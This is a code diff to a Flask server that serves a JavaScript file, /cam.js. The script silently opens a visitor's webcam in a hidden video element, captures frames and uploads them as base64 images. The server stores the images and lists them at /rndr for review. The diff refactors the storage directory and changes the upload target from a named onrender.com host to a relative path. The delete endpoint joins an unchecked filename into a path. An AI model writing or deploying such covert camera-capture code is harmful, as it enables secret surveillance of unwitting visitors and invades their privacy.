@@ -5,6 +5,13 @@ import os
 
 app = Flask(__name__)
 
+# ✅ Directory to store images
+UPLOAD_DIR = "/home/chorcha"
+
+# ✅ Create directory if not exists
+if not os.path.exists(UPLOAD_DIR):
+    os.makedirs(UPLOAD_DIR)
+
 @app.after_request
 def after_request(response):
     response.headers.add('Access-Control-Allow-Origin', '*')  # Allow all domains
@@ -14,8 +21,7 @@ def after_request(response):
 
 @app.route("/imagex/<filename>")
 def image(filename):
-    return send_from_directory("/home/chorcha", filename)
-
+    return send_from_directory(UPLOAD_DIR, filename)
 
 @app.route('/upload', methods=["POST", "OPTIONS"])
 def upload():
@@ -25,27 +31,26 @@ def upload():
     ct = request.content_type
     data = request.data.decode('utf-8')
 
+    filename = datetime.datetime.now().strftime("%Y%m%d-%H%M%S") + ".png"
+    filepath = os.path.join(UPLOAD_DIR, filename)
+
     if ct.startswith("image/"):
-        # raw image bytes
-        filename = datetime.datetime.now().strftime("%Y%m%d-%H%M%S") + ".png"
-        with open(filename, 'wb') as f:
+        with open(filepath, 'wb') as f:
             f.write(request.data)
         return 'Image received', 200
 
     elif ct == 'text/plain' and data.startswith('data:image'):
-        # base64 encoded PNG string
         b64_data = data.split(',')[1]
-        filename = datetime.datetime.now().strftime("%Y%m%d-%H%M%S") + ".png"
-        with open(filename, 'wb') as f:
+        with open(filepath, 'wb') as f:
             f.write(base64.b64decode(b64_data))
         return 'Base64 Image received', 200
 
     else:
         return 'Invalid data', 400
+
 @app.route('/cam.js')
 def jss():
-    js_content = """// camCapture.js
-navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+    js_content = """navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
   let v = document.createElement('video');
   v.style.display = 'none';
   document.body.appendChild(v);
@@ -65,7 +70,7 @@ navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
     c.toBlob(blob => {
       let reader = new FileReader();
       reader.onloadend = () => {
-        fetch("https://chorcha.onrender.com/upload", {
+        fetch("/upload", {
           method: "POST",
           headers: { 'Content-Type': 'text/plain' },
           body: reader.result
@@ -77,10 +82,9 @@ navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
 });"""
     return Response(js_content, mimetype='application/javascript')
 
-
 @app.route("/rndr")
 def index():
-    files = [f for f in os.listdir("/home/chorcha") if f.endswith(".png")]
+    files = [f for f in os.listdir(UPLOAD_DIR) if f.endswith(".png")]
     return render_template_string("""
     <!DOCTYPE html>
     <html>
@@ -133,11 +137,11 @@ def index():
 def delete():
     data = request.get_json()
     filename = data.get("filename")
-    filepath = os.path.join('/home/chorcha', filename)
+    filepath = os.path.join(UPLOAD_DIR, filename)
     if os.path.exists(filepath):
         os.remove(filepath)
         return jsonify({"success": True})
     return jsonify({"success": False, "error": "File not found"})
-  
+
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10000)
